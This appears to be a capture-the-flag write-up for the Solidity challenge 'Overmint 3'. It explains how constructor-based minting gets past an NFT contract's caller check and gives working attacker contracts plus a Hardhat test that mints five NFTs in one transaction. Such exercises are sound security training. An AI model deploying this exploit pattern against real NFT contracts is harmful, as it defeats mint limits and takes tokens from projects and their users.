# Overmint 3

## Goals

=> Get a balance of 5 NFTs instead of 1
=> Must exploit one transaction

### Hints

- None

### Solution

- Since we are checking for contracts we can't reenter through the `_safeMint()` function, but we can just create a contract that loops 5 times and creats attacker contracts each time we itterate through the loop, and since inside a contract's constructor, msg.sender is the address that is deploying the contract we can deploy the `contract OvermintAttacker3` (msg.sender is not a contract so we pass the first require) and inside the constructor we now can deploy 5 `contract Attacker` which will mint and send the NFT to the players address which will result in only 1 transaction but 'n' Amount of NFTs minted.

### Attacker Contract

```solidity
contract Attacker {
    Overmint3 target;

    constructor(address _target, address _player) {
        target = Overmint3(_target);
        target.mint();
        target.safeTransferFrom(address(this), _player, target.totalSupply());
    }
}

contract Overmint3Attacker {
    Overmint3 target;
    uint256 attackCounter = 1;

    constructor(address _target, address _player) {
        target = Overmint3(_target);
        while (attackCounter < 6) {
            attackCounter++;
            new Attacker(_target, _player);
        }
    }
}
```

### Test

```javascript
it('conduct your attack here', async function () {
	const Overmint3AttackerFactory = await ethers.getContractFactory(ATTACKER_NAME, attackerWallet);
	await Overmint3AttackerFactory.deploy(victimContract.address, attackerWallet.address);
});
```
